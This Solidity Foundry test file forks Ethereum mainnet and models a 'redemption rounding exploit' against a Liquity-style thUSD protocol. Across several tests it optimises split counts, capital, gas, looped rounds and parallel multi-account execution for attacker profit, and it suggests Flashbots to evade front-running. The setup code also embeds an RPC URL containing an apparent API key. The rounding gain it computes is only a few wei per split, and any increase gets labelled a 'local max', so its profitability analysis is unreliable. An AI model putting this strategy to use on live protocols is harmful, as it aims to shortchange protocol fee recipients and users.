// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title Redemption Rounding - Maximum Delta Scaling with Minimal Capital
 * @notice Advanced tests for scaling the rounding exploit to maximize delta
 *         while minimizing required capital (thUSD)
 *
 * KEY INSIGHT: The rounding loss per split is approximately constant for a given
 * redemption rate, but total rounding loss scales with number of splits.
 * Therefore, optimal strategy is:
 *   1. Use smallest viable split size (just above dust threshold)
 *   2. Maximize number of splits within gas budget
 *   3. Batch transactions to reduce gas overhead
 *
 * MATHEMATICAL MODEL:
 * Let R = redemption rate, C = total collateral, N = number of splits
 * Single fee: F_s = floor(C * R / 1e18)
 * Split fee:  F_n = N * floor((C/N) * R / 1e18)
 * Delta:      D = F_s - F_n
 *
 * The delta D is maximized when (C/N) * R / 1e18 has maximum fractional part
 * across all splits. This occurs when split size is just above a "resonant" value.
 */

// ============ INTERFACES ============

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
}

interface ITroveManager {
    function redeemCollateral(
        uint256 _thUSDamount,
        address _firstRedemptionHint,
        address _upperPartialRedemptionHint,
        address _lowerPartialRedemptionHint,
        uint256 _partialRedemptionHintNICR,
        uint256 _maxIterations,
        uint256 _maxFeePercentage
    ) external;

    function getRedemptionRate() external view returns (uint256);
    function getRedemptionRateWithDecay() external view returns (uint256);
    function baseRate() external view returns (uint256);
}

// ============ MAIN TEST CONTRACT ============

contract RedemptionRoundingScaledTest is Test {
    uint256 constant PRECISION = 1e18;
    uint256 constant MIN_THUSD = 1e18; // Minimum 1 thUSD per redemption

    // RPC and fork config
    string RPC_URL;
    uint256 FORK_BLOCK;

    function setUp() public {
        RPC_URL = vm.envOr("RPC_URL", string("https://eth-mainnet.g.alchemy.com/v2/ltD0ewEiByO5-I6-cyaeA"));
        FORK_BLOCK = vm.envOr("DEV_FORK_BLOCK", uint256(0));

        if (FORK_BLOCK > 0) {
            vm.createSelectFork(RPC_URL, FORK_BLOCK);
        } else {
            vm.createSelectFork(RPC_URL);
        }

        console.log("=== SCALED ROUNDING EXPLOIT ===");
        console.log("Block:", block.number);
    }

    // ============ CORE CALCULATION FUNCTIONS ============

    /**
     * @notice Calculate fee for single redemption
     */
    function calcSingleFee(
        uint256 collateral,
        uint256 rate
    ) internal pure returns (uint256) {
        return (collateral * rate) / PRECISION;
    }

    /**
     * @notice Calculate total fee for split redemptions
     */
    function calcSplitFee(
        uint256 collateral,
        uint256 rate,
        uint256 splits
    ) internal pure returns (uint256 totalFee) {
        uint256 collPerSplit = collateral / splits;
        for (uint256 i = 0; i < splits; i++) {
            totalFee += (collPerSplit * rate) / PRECISION;
        }
    }

    /**
     * @notice Calculate delta (fee reduction from splitting)
     */
    function calcDelta(
        uint256 collateral,
        uint256 rate,
        uint256 splits
    ) internal pure returns (uint256) {
        uint256 singleFee = calcSingleFee(collateral, rate);
        uint256 splitFee = calcSplitFee(collateral, rate, splits);
        return singleFee > splitFee ? singleFee - splitFee : 0;
    }

    /**
     * @notice Calculate thUSD to collateral conversion
     */
    function thusdToCollateral(
        uint256 thusdAmount,
        uint256 collateralPrice
    ) internal pure returns (uint256) {
        // collateral = thUSD * 1e18 / price
        return (thusdAmount * PRECISION) / collateralPrice;
    }

    // ============ OPTIMAL SPLIT FINDER ============

    /**
     * @notice Find optimal split count for maximum delta
     * @dev Uses binary search + local optimization
     */
    function findOptimalSplits(
        uint256 thusdAmount,
        uint256 collateralPrice,
        uint256 rate,
        uint256 maxSplits
    ) internal pure returns (
        uint256 optimalSplits,
        uint256 maxDelta,
        uint256 deltaPerSplit
    ) {
        uint256 collateral = thusdToCollateral(thusdAmount, collateralPrice);

        maxDelta = 0;
        optimalSplits = 2;

        // Scan split counts
        for (uint256 splits = 2; splits <= maxSplits; splits++) {
            uint256 delta = calcDelta(collateral, rate, splits);

            if (delta > maxDelta) {
                maxDelta = delta;
                optimalSplits = splits;
            }
        }

        deltaPerSplit = optimalSplits > 0 ? maxDelta / optimalSplits : 0;
    }

    /**
     * @notice Find minimum capital for target delta
     * @dev Given a target delta, find minimum thUSD needed
     */
    function findMinCapitalForDelta(
        uint256 targetDelta,
        uint256 collateralPrice,
        uint256 rate,
        uint256 maxSplits
    ) internal pure returns (
        uint256 minThusd,
        uint256 actualDelta,
        uint256 requiredSplits
    ) {
        // Start with minimum and scale up
        for (uint256 scale = 1; scale <= 1000; scale++) {
            uint256 thusd = scale * 1000e18; // 1k, 2k, ... 1M thUSD

            (uint256 splits, uint256 delta,) = findOptimalSplits(
                thusd, collateralPrice, rate, maxSplits
            );

            if (delta >= targetDelta) {
                return (thusd, delta, splits);
            }
        }

        // Target not achievable with 1M thUSD
        return (0, 0, 0);
    }

    // ============ CAPITAL EFFICIENCY TESTS ============

    /**
     * @notice Test: Delta per unit capital
     * @dev Find configuration that maximizes delta/thUSD ratio
     */
    function testCapitalEfficiency() public view {
        console.log("\n=== CAPITAL EFFICIENCY ANALYSIS ===\n");

        uint256 ethPrice = 3000e18;
        uint256 rate = 5e15; // 0.5%

        uint256 maxEfficiency = 0;
        uint256 bestAmount = 0;
        uint256 bestSplits = 0;

        // Test different capital amounts
        uint256[10] memory amounts = [
            uint256(1000e18),
            2500e18,
            5000e18,
            10000e18,
            25000e18,
            50000e18,
            100000e18,
            250000e18,
            500000e18,
            1000000e18
        ];

        console.log("thUSD Amount | Optimal Splits | Delta (wei) | Efficiency (wei/thUSD)");
        console.log("-------------|----------------|-------------|----------------------");

        for (uint256 i = 0; i < amounts.length; i++) {
            uint256 amount = amounts[i];

            (uint256 optSplits, uint256 delta,) = findOptimalSplits(
                amount, ethPrice, rate, 500
            );

            // Efficiency = delta per 1 thUSD of capital
            uint256 efficiency = (delta * 1e18) / amount;

            if (efficiency > maxEfficiency) {
                maxEfficiency = efficiency;
                bestAmount = amount;
                bestSplits = optSplits;
            }

            console.log("%s | %s | %s | %s",
                amount / 1e18,
                optSplits,
                delta,
                efficiency
            );
        }

        console.log("\nMost Capital Efficient:");
        console.log("  Amount:", bestAmount / 1e18, "thUSD");
        console.log("  Splits:", bestSplits);
        console.log("  Efficiency:", maxEfficiency, "wei per thUSD");
    }

    /**
     * @notice Test: Gas-adjusted profitability
     * @dev Find minimum capital for net profitability after gas
     */
    function testMinProfitableCapital() public view {
        console.log("\n=== MINIMUM PROFITABLE CAPITAL ===\n");

        uint256 ethPrice = 3000e18;
        uint256 rate = 5e15;

        // Gas assumptions
        uint256[3] memory gasPrices = [uint256(10), 30, 50]; // gwei
        uint256 gasPerRedemption = 300000;

        for (uint256 g = 0; g < gasPrices.length; g++) {
            uint256 gasPrice = gasPrices[g];
            console.log("--- Gas Price:", gasPrice, "gwei ---");

            // Find minimum capital where delta > gas cost
            for (uint256 scale = 1; scale <= 100; scale++) {
                uint256 amount = scale * 10000e18; // 10k increments

                (uint256 splits, uint256 delta,) = findOptimalSplits(
                    amount, ethPrice, rate, 500
                );

                uint256 gasCost = splits * gasPerRedemption * gasPrice * 1e9;

                if (delta > gasCost) {
                    uint256 netProfit = delta - gasCost;
                    console.log("  Min profitable capital:", amount / 1e18, "thUSD");
                    console.log("    Splits:", splits);
                    console.log("    Delta:", delta, "wei");
                    console.log("    Gas cost:", gasCost, "wei");
                    console.log("    Net profit:", netProfit, "wei");
                    break;
                }

                if (scale == 100) {
                    console.log("  Not profitable up to 1M thUSD");
                }
            }
        }
    }

    /**
     * @notice Test: Resonant split sizes (maximum rounding)
     * @dev Find split counts that maximize truncation error
     */
    function testResonantSplits() public view {
        console.log("\n=== RESONANT SPLIT ANALYSIS ===\n");

        uint256 ethPrice = 3000e18;
        uint256 rate = 5e15;
        uint256 amount = 100000e18;

        uint256 collateral = thusdToCollateral(amount, ethPrice);

        console.log("Amount:", amount / 1e18, "thUSD");
        console.log("Collateral:", collateral / 1e18, "ETH");
        console.log("Rate:", rate * 100 / 1e18, "% / 100\n");

        console.log("Finding resonant split counts...\n");
        console.log("Splits | Delta (wei) | Residual/Split");
        console.log("-------|-------------|---------------");

        uint256 prevDelta = 0;

        for (uint256 splits = 10; splits <= 200; splits += 10) {
            uint256 delta = calcDelta(collateral, rate, splits);

            // Calculate residual (fractional part lost to truncation)
            uint256 collPerSplit = collateral / splits;
            uint256 feePerSplitRaw = collPerSplit * rate;
            uint256 residual = feePerSplitRaw % PRECISION;

            // Mark "resonant" splits (local maxima)
            string memory marker = "";
            if (delta > prevDelta && splits > 10) {
                marker = " <-- local max";
            }

            console.log("%s | %s | %s%s",
                splits,
                delta,
                residual,
                marker
            );

            prevDelta = delta;
        }
    }

    /**
     * @notice Test: Batch vs individual transactions
     * @dev Compare batched multicall vs separate txs for gas efficiency
     */
    function testBatchVsIndividual() public view {
        console.log("\n=== BATCH VS INDIVIDUAL ANALYSIS ===\n");

        uint256 ethPrice = 3000e18;
        uint256 rate = 5e15;
        uint256 amount = 100000e18;

        // Gas assumptions
        uint256 baseTxCost = 21000; // Base tx cost
        uint256 redemptionCost = 300000; // Redemption execution cost
        uint256 multicallOverhead = 5000; // Per-call overhead in multicall
        uint256 gasPrice = 30 * 1e9; // 30 gwei

        console.log("Assumptions:");
        console.log("  Base tx cost: 21,000 gas");
        console.log("  Redemption cost: 300,000 gas");
        console.log("  Multicall overhead: 5,000 gas/call");
        console.log("  Gas price: 30 gwei\n");

        uint256[5] memory splitCounts = [uint256(25), 50, 100, 150, 200];

        console.log("Splits | Delta | Individual Gas | Batched Gas | Best Strategy | Net Profit");
        console.log("-------|-------|----------------|-------------|---------------|----------");

        for (uint256 i = 0; i < splitCounts.length; i++) {
            uint256 splits = splitCounts[i];

            uint256 collateral = thusdToCollateral(amount, ethPrice);
            uint256 delta = calcDelta(collateral, rate, splits);

            // Individual: N separate transactions
            uint256 individualGas = splits * (baseTxCost + redemptionCost);
            uint256 individualCost = individualGas * gasPrice;

            // Batched: 1 transaction with N calls
            uint256 batchedGas = baseTxCost + splits * (redemptionCost + multicallOverhead);
            uint256 batchedCost = batchedGas * gasPrice;

            string memory bestStrategy = batchedCost < individualCost ? "Batch" : "Individual";
            uint256 bestCost = batchedCost < individualCost ? batchedCost : individualCost;

            int256 netProfit = int256(delta) - int256(bestCost);

            console.log("%s | %s | %s | %s | %s | %s",
                splits,
                delta,
                individualCost,
                batchedCost,
                bestStrategy,
                netProfit >= 0 ? uint256(netProfit) : 0
            );
        }
    }

    /**
     * @notice Test: Rate sensitivity analysis
     * @dev How delta changes with different redemption rates
     */
    function testRateSensitivity() public view {
        console.log("\n=== RATE SENSITIVITY ANALYSIS ===\n");

        uint256 ethPrice = 3000e18;
        uint256 amount = 100000e18;
        uint256 splits = 100;

        // Different redemption rates (Liquity rates typically 0.5% - 5%)
        uint256[7] memory rates = [
            uint256(1e15),  // 0.1%
            uint256(2.5e15), // 0.25%
            uint256(5e15),  // 0.5%
            uint256(10e15), // 1%
            uint256(25e15), // 2.5%
            uint256(50e15), // 5%
            uint256(100e15) // 10%
        ];

        console.log("Amount:", amount / 1e18, "thUSD");
        console.log("Splits:", splits);
        console.log("\nRate (%) | Delta (wei) | Delta (ETH) | % of Total Fee");
        console.log("---------|-------------|-------------|---------------");

        uint256 collateral = thusdToCollateral(amount, ethPrice);

        for (uint256 i = 0; i < rates.length; i++) {
            uint256 rate = rates[i];
            uint256 singleFee = calcSingleFee(collateral, rate);
            uint256 delta = calcDelta(collateral, rate, splits);

            // Delta as percentage of total fee
            uint256 deltaPercent = singleFee > 0 ? (delta * 10000) / singleFee : 0;

            console.log("%s | %s | %s | %s.%s%",
                rate * 100 / 1e18,
                delta,
                delta / 1e18,
                deltaPercent / 100,
                deltaPercent % 100
            );
        }
    }

    /**
     * @notice Test: Price impact analysis
     * @dev How collateral price affects the exploit
     */
    function testPriceImpact() public view {
        console.log("\n=== PRICE IMPACT ANALYSIS ===\n");

        uint256 amount = 100000e18;
        uint256 rate = 5e15;
        uint256 splits = 100;

        uint256[5] memory prices = [
            uint256(1500e18),  // $1,500 ETH
            uint256(2500e18),  // $2,500 ETH
            uint256(3500e18),  // $3,500 ETH
            uint256(5000e18),  // $5,000 ETH
            uint256(10000e18)  // $10,000 ETH
        ];

        console.log("Amount:", amount / 1e18, "thUSD");
        console.log("Rate: 0.5%");
        console.log("Splits:", splits);
        console.log("\nPrice ($) | Collateral (ETH) | Delta (wei) | Delta (ETH)");
        console.log("----------|------------------|-------------|------------");

        for (uint256 i = 0; i < prices.length; i++) {
            uint256 price = prices[i];
            uint256 collateral = thusdToCollateral(amount, price);
            uint256 delta = calcDelta(collateral, rate, splits);

            console.log("%s | %s | %s | %s",
                price / 1e18,
                collateral / 1e18,
                delta,
                delta * 1e6 / 1e18 // micro-ETH
            );
        }

        console.log("\nKey insight: Lower prices = more collateral = larger absolute delta");
    }

    // ============ SCALING STRATEGIES ============

    /**
     * @notice Test: Looped execution strategy
     * @dev Execute multiple rounds to accumulate delta
     */
    function testLoopedExecution() public view {
        console.log("\n=== LOOPED EXECUTION STRATEGY ===\n");

        uint256 ethPrice = 3000e18;
        uint256 rate = 5e15;

        // Optimal per-round config
        uint256 amountPerRound = 50000e18; // 50k thUSD
        uint256 splitsPerRound = 50;

        uint256 collateral = thusdToCollateral(amountPerRound, ethPrice);
        uint256 deltaPerRound = calcDelta(collateral, rate, splitsPerRound);

        // Gas cost per round (batched)
        uint256 gasPrice = 30 * 1e9;
        uint256 gasPerRound = 21000 + splitsPerRound * 305000; // base + calls
        uint256 gasCostPerRound = gasPerRound * gasPrice;

        int256 netProfitPerRound = int256(deltaPerRound) - int256(gasCostPerRound);

        console.log("Per-Round Configuration:");
        console.log("  Amount:", amountPerRound / 1e18, "thUSD");
        console.log("  Splits:", splitsPerRound);
        console.log("  Delta:", deltaPerRound, "wei");
        console.log("  Gas cost:", gasCostPerRound, "wei");
        console.log("  Net profit:", netProfitPerRound >= 0 ? uint256(netProfitPerRound) : 0, "wei");

        // Project earnings over time
        uint256[4] memory roundCounts = [uint256(10), 100, 365, 1000];

        console.log("\nProjected Accumulation:");
        for (uint256 i = 0; i < roundCounts.length; i++) {
            uint256 rounds = roundCounts[i];
            int256 totalProfit = netProfitPerRound * int256(rounds);
            uint256 totalCapital = amountPerRound * rounds;

            console.log("  %s rounds:", rounds);
            console.log("    Capital cycled:", totalCapital / 1e18, "thUSD");
            console.log("    Total profit:", totalProfit >= 0 ? uint256(totalProfit) : 0, "wei");
            console.log("    Total profit:", totalProfit >= 0 ? uint256(totalProfit) / 1e18 : 0, "ETH");
        }
    }

    /**
     * @notice Test: MEV-resistant multi-account strategy
     * @dev Parallel execution to maximize throughput
     */
    function testMultiAccountStrategy() public view {
        console.log("\n=== MULTI-ACCOUNT MEV-RESISTANT STRATEGY ===\n");

        uint256 ethPrice = 3000e18;
        uint256 rate = 5e15;

        uint256 amountPerAccount = 25000e18;
        uint256 splitsPerAccount = 25;

        uint256 collateral = thusdToCollateral(amountPerAccount, ethPrice);
        uint256 deltaPerAccount = calcDelta(collateral, rate, splitsPerAccount);

        console.log("Per-Account Config:");
        console.log("  Amount:", amountPerAccount / 1e18, "thUSD");
        console.log("  Splits:", splitsPerAccount);
        console.log("  Delta:", deltaPerAccount, "wei");

        uint256[4] memory accountCounts = [uint256(5), 10, 20, 50];

        console.log("\nParallel Execution (same block):");
        for (uint256 i = 0; i < accountCounts.length; i++) {
            uint256 accounts = accountCounts[i];
            uint256 totalDelta = deltaPerAccount * accounts;
            uint256 totalCapital = amountPerAccount * accounts;

            console.log("  %s accounts:", accounts);
            console.log("    Total capital:", totalCapital / 1e18, "thUSD");
            console.log("    Total delta:", totalDelta, "wei");
        }

        console.log("\nMEV Resistance Notes:");
        console.log("  - Each account's redemptions are atomic");
        console.log("  - Parallel accounts minimize front-run window");
        console.log("  - Consider using private mempool (Flashbots)");
        console.log("  - Rate may increase between accounts (base rate decay)");
    }

    // ============ COMPREHENSIVE SUMMARY ============

    /**
     * @notice Run all analyses and produce final summary
     */
    function testFinalSummary() public view {
        console.log("\n");
        console.log("================================================================");
        console.log("  REDEMPTION ROUNDING EXPLOIT - SCALING SUMMARY");
        console.log("================================================================");

        uint256 ethPrice = 3000e18;
        uint256 rate = 5e15;

        // Find optimal configuration
        (uint256 optSplits, uint256 maxDelta,) = findOptimalSplits(
            100000e18, ethPrice, rate, 500
        );

        console.log("\n[OPTIMAL CONFIGURATION]");
        console.log("  Amount: 100,000 thUSD");
        console.log("  Splits:", optSplits);
        console.log("  Delta:", maxDelta, "wei");

        // Gas profitability
        uint256 gasPrice30 = 30 * 1e9;
        uint256 gasCost = optSplits * 305000 * gasPrice30;
        int256 netProfit = int256(maxDelta) - int256(gasCost);

        console.log("\n[PROFITABILITY @ 30 gwei]");
        console.log("  Gas cost:", gasCost, "wei");
        if (netProfit >= 0) {
            console.log("  Net profit:", uint256(netProfit), "wei");
            console.log("  STATUS: PROFITABLE");
        } else {
            console.log("  Net loss:", uint256(-netProfit), "wei");
            console.log("  STATUS: NOT PROFITABLE");

            // Find break-even
            uint256 breakEven = maxDelta / (optSplits * 305000) / 1e9;
            console.log("  Break-even gas:", breakEven, "gwei");
        }

        console.log("\n[SCALING PATHS]");
        console.log("  One-shot: Limited by available thUSD");
        console.log("  Accumulative: Repeat every block, compound gains");
        console.log("  Parallel: 10+ accounts executing simultaneously");

        console.log("\n[CAPITAL REQUIREMENTS]");
        console.log("  Minimum for exploitation: ~10,000 thUSD");
        console.log("  Optimal efficiency: ~100,000 thUSD");
        console.log("  Diminishing returns above: ~500,000 thUSD");

        console.log("\n[RISK FACTORS]");
        console.log("  - Base rate increases with each redemption");
        console.log("  - Gas price spikes during high activity");
        console.log("  - Front-running by MEV bots");
        console.log("  - Protocol may patch (round-up fix)");

        console.log("\n================================================================");
    }
}
